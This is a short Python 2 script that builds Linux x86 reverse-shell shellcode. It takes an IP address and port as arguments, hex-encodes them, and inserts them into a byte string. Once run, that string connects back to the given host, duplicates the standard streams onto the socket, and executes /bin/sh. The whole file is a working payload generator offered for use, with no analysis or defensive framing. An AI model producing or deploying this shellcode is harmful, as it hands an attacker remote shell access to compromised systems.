import sys
import socket


if len(sys.argv) is not 3:
    print "Usage: python wrapper.py [IP] [PORT NUMBER]"
    exit()


ip = socket.inet_aton(sys.argv[1])
port = int(sys.argv[2])


ip = ip.encode('hex')
ip = "\\x" + ip[0:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:8]


if port < 1 or port > 65535:
    print "Please enter port within range of 1 - 65535"
    exit()
if port < 1000:
    print "You need to have root privileges to use this port!"


port = format(port,'04x')


port = "\\x"+str(port[0:2])+"\\x"+str(port[2:4])


if "\\x00" in port:
    print "Null's in port, Please select an other port!"
    exit()


shellcode = """\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\xfe\\xc3\\x68%s\\x66\\x68%s\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xfe\\xc3\\xcd\\x80\\x87\\xdf\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\\x04\\x75\\xf5\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80""" % (ip,port)


print shellcode
